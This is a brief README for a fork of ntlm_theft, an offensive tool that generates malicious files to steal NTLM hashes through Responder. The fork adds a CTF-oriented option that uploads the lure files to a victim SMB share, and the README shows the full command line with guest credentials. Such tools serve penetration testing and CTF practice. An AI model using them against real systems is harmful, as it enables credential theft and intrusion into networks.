This is a fork of [ntlm_theft](https://github.com/Greenwolf/ntlm_theft) A tool to generate malicious files to steal ntlm hashes using responder. 
I have added an optional CTF arg (not realistic for realworld i don't think). This `upload` argument will take all the files generated byt ntlm_theft
and upload them to the victim defined by rserver andd rport


`python3 ntlm_theft.py --generate all --server 127.0.0.1 --filename 'desktop' --upload -rserver localhost -rport 445 -smbuser guest -smbpass '' -d ./desktop/`

After normal generation of the malicious files it will take the directory created and upload the files
